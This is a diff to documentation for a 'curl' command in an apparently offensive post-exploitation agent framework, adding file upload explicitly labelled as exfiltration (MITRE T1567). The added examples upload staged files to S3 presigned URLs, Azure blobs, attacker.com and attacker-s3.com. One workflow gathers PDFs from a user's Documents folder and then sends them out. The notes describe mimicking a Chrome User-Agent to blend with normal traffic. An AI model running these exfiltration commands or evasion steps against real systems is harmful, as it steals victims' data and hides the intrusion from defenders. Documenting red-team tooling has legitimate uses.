@@ -7,9 +7,9 @@ hidden = false
 
 ## Summary
 
-Make HTTP/HTTPS requests from the agent's network perspective. Useful for accessing cloud metadata endpoints, probing internal services, checking web application health, and performing SSRF-style requests from a compromised host.
+Make HTTP/HTTPS requests and upload files from the agent's network perspective. Supports file upload for exfiltration to S3 presigned URLs, Azure SAS tokens, or generic HTTP endpoints (T1567). Also useful for cloud metadata, internal services, and SSRF.
 
-Supports all standard HTTP methods, custom headers, request bodies, response size limits, and three output modes.
+Supports all standard HTTP methods, custom headers, request bodies, file upload (raw or multipart), response size limits, and three output modes.
 
 ## Arguments
 
@@ -21,6 +21,8 @@ Supports all standard HTTP methods, custom headers, request bodies, response siz
 | headers | No | string | | Custom headers as JSON object: `{"Key": "Value"}` |
 | output | No | choice | full | Output format: full (headers+body), body, headers |
 | timeout | No | number | 30 | Request timeout in seconds |
+| file | No | string | | File path to upload as request body (T1567 exfiltration). Method defaults to PUT |
+| upload | No | choice | raw | Upload mode: raw (file as body, for PUT/S3) or multipart (form-data, for POST) |
 | max_size | No | number | 1048576 | Maximum response body size in bytes (default: 1MB) |
 
 ## Usage
@@ -55,6 +57,29 @@ curl -url https://config-service.local/api/setting -method PUT -body '{"key":"va
 curl -url https://large-file-server.local/data.json -max_size 4096
 ```
 
+### File Upload / Exfiltration (T1567)
+
+**Upload to S3 presigned URL (raw PUT):**
+```
+curl -url "https://bucket.s3.amazonaws.com/exfil.dat?X-Amz-..." -file /tmp/staged-data.dat
+```
+
+**Upload to Azure Blob (raw PUT with SAS token):**
+```
+curl -url "https://account.blob.core.windows.net/container/blob?sv=..." -file /tmp/staged-data.dat -headers '{"x-ms-blob-type":"BlockBlob"}'
+```
+
+**Upload via multipart POST:**
+```
+curl -url https://attacker.com/upload -file /tmp/staged-data.dat -upload multipart
+```
+
+**Exfiltration workflow (stage + encrypt + upload):**
+```
+compress -action stage -path /home/user/Documents -pattern *.pdf
+curl -url "https://attacker-s3.com/exfil.dat?presigned..." -file /tmp/sys-update-abc123/deadbeef.dat
+```
+
 ## Notes
 
 - Default User-Agent mimics Chrome browser to blend with normal traffic
@@ -70,3 +95,5 @@ curl -url https://large-file-server.local/data.json -max_size 4096
 ## MITRE ATT&CK Mapping
 
 - **T1106** — Native API
+- **T1567** — Exfiltration Over Web Service (file upload)
+- **T1567.002** — Exfiltration to Cloud Storage (S3/Azure upload)
